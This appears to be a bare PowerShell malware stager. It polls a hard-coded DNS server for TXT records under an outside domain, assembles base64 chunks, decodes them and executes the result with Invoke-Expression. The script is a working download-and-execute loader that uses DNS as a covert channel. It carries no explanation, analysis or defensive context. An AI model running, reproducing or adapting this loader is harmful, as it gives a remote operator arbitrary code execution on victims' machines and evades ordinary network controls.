$s = "54.237.100.230"
$n = "koratxt.org"
$f="";$i=0;function conn($q){return $(Resolve-DnsName -s $s -na "$q.6d6163.$n" -ty t).strings[0]};$z=conn("s");while($z -eq $null){sleep -s 60;$z=conn("s")};do{$x=conn($i);$i+=$x.Length;$f+=$x}while($i -lt [int]$z);
iex $([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($f)))
